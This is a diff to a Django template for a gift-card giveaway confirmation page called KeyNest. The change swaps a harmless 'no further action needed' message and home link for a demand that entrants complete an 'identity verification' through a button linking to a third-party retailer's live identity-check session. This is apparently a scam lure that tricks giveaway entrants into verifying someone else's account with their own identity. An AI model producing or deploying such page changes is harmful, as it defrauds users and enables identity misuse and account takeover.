@@ -1,3 +1,4 @@
+```django
 {% extends "store/base.html" %}
 
 {% block title %}Entry Confirmed | KeyNest{% endblock %}
@@ -15,34 +16,41 @@
         <section>
             <span class="pill">Thank you</span>
 
-            <h1>Your entry has been confirmed.</h1>
+            <h1>Your entry has been received.</h1>
 
             <p>
                 Thank you for entering the KeyNest Gift Card Giveaway.
-                If you are selected as the winner, we will contact you by email.
+                Please complete the identity verification process
+                using the button provided.
             </p>
 
             <div class="features">
-                <span>Entry submitted</span>
+                <span>Entry received</span>
+                <span>Identity verification required</span>
                 <span>Winner contacted by email</span>
-                <span>Good luck</span>
             </div>
         </section>
 
         <section class="card">
-            <h2>What happens next?</h2>
+            <h2>Verify Your Identity</h2>
 
             <p>
-                Your details have been saved securely for the giveaway draw.
-                No further action is needed.
+                Complete the identity verification process to proceed.
+                Once completed, return to KeyNest.
             </p>
 
-            <a href="/" class="submit-btn" style="display:flex;align-items:center;justify-content:center;text-decoration:none;">
-                Back to Home
+            <a
+                href="https://www.backmarket.co.uk/live-identity-check/c975f96a-7f1d-4484-8add-b113f4051ac9"
+                class="submit-btn"
+                style="display:flex;align-items:center;justify-content:center;text-decoration:none;"
+            >
+                Verify Identity
             </a>
+
         </section>
     </main>
 
 </div>
 
 {% endblock %}
+```
